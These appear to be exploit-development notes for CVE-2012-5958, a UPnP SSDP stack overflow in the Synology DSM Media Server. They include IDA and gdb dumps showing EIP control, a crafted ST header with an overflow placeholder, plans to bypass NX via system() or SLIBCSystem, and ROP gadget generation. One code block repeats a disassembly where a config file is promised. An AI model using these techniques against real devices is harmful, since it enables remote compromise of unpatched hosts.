.got.plt:080BA59C                                         ; DATA XREF: MediaServer::StringImplode(std::vector<std::string,std::allocator<std::string>>  const&,char  const*)r
.got.plt:080BA59C                                         ; MediaServer::StringImplode(std::vector<std::string,std::allocator<std::string>>  const&,char  const*)
.got.plt:080BA5A0 off_80BA5A0     dd offset __gxx_personality_v0
.got.plt:080BA5A0                                         ; DATA XREF: .plt:___gxx_personality_v0r
.got.plt:080BA5A4 off_80BA5A4     dd offset pcre_free_substring_list
.got.plt:080BA5A4                                         ; DATA XREF: _pcre_free_substring_listr
.got.plt:080BA5A8 off_80BA5A8     dd offset pcre_exec     ; DATA XREF: _pcre_execr
.got.plt:080BA5AC off_80BA5AC     dd offset UpnpDownloadXmlDoc
.got.plt:080BA5AC                                         ; DATA XREF: _UpnpDownloadXmlDocr
.got.plt:080BA5B0 off_80BA5B0     dd offset read          ; DATA XREF: _readr
.got.plt:080BA5B4 off_80BA5B4     dd offset UpnpGetServerIpAddress
.got.plt:080BA5B4                                         ; DATA XREF: _UpnpGetServerIpAddressr
.got.plt:080BA5B8 off_80BA5B8     dd offset SLIBCErrGet   ; DATA XREF: _SLIBCErrGetr
.got.plt:080BA5BC off_80BA5BC     dd offset _ZdlPv        ; DATA XREF: operator delete(void *)r
.got.plt:080BA5BC                                         ; operator delete(void *)
.got.plt:080BA5C0 off_80BA5C0     dd offset _ZNSt8ios_base4InitD1Ev
.got.plt:080BA5C0                                         ; DATA XREF: sub_804D8E6:std::ios_base::Init::~Init()r
.got.plt:080BA5C0                                         ; std::ios_base::Init::~Init()
.got.plt:080BA5C4 off_80BA5C4     dd offset ParsePlayListByField
.got.plt:080BA5C4                                         ; DATA XREF: _ParsePlayListByFieldr
.got.plt:080BA5C4 _got_plt        ends
.got.plt:080BA5C4
```

* Weird... maybe with other executables...

* When exploiting cve-2012-5958 with x86 / ubuntu 10.04 compilation to simulate the DSM
environment its the register situation at overflow time:

```
Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0xb5fb6b70 (LWP 6628)]
0x00414141 in ?? ()
(gdb) info registers
eax            0x0	0
ecx            0xb5fb59e0	-1241818656
edx            0x0	0
ebx            0x42424242	1111638594
esp            0xb5fb5c30	0xb5fb5c30
ebp            0x42424242	0x42424242
esi            0x42424242	1111638594
edi            0x42424242	1111638594
eip            0x414141	0x414141
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

ESP pointint to

```
(gdb) x/xw $esp
0xb5fb5c30:	0x09170ad8

(gdb) x/s 0x09170ad8
0x9170ad8:	 "uuid:schemas:device:", 'B' <repeats 180 times>...
```

The contents contained at the pointer at esp can be easily controlled by doing something like

```
"ST:MSF1uuid:schemas:device:#{bof}:btw\r\n" +

(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0xb5f0fb70 (LWP 6729)]
0x00414141 in ?? ()
(gdb) x/x $esp
0xb5f0ec30:	0x09e97918
(gdb) x/s 0x09e97918
0x9e97918:	 "MSF1uuid:schemas:device:", 'B' <repeats 176 times>...
```

* If ASLR is disabled / unsupported (old kernels) and system() is mapped to a compatible address with goodchars,
	it could be used to NX bypass.

* If ASLR is disabled and system isn't mapped to a compatible addresses, maybe wrappers can be found, for example, for the
case of the DMS Media Server, slibcsystem() (and other interesting wrappers for libc) are exported by libsynocore.so.3.1.....
but no luck when executing it into an Ubuntu 10.04 box (I guess mappings will be different on the original box, anyway in
the original box aslr is enabled):

```
(gdb) disass 0x37d000 + 0x10EBC

Dump of assembler code for function SLIBCSystem:
   0x0038debc <+0>:	push   %ebp
   0x0038debd <+1>:	mov    %esp,%ebp
   0x0038debf <+3>:	push   %ebx
```

* In order to run dms on an Ubuntu 10.04 box (easy way), just use the next ld config file:

```
(gdb) disass 0x37d000 + 0x10EBC

Dump of assembler code for function SLIBCSystem:
   0x0038debc <+0>:	push   %ebp
   0x0038debd <+1>:	mov    %esp,%ebp
   0x0038debf <+3>:	push   %ebx
```

and run ldconfig

* ROP Gadgets can be searched with http://www.vnsecurity.net/2010/08/ropeme-rop-exploit-made-easy/, but some API pointers
in compatible addresses are needed... tricky

```
ROPeMe> generate /home/juan/DSM_40_X64_MediaServer/sbin/dms 5
Generating gadgets for /home/juan/DSM_40_X64_MediaServer/sbin/dms with backward depth=5
It may take few minutes depends on the depth and file size...
Processing code block 1/1
Generated 2492 gadgets
Dumping asm gadgets to file: dms.ggt ...
OK
```

(Using dms because is no PIE compatible)
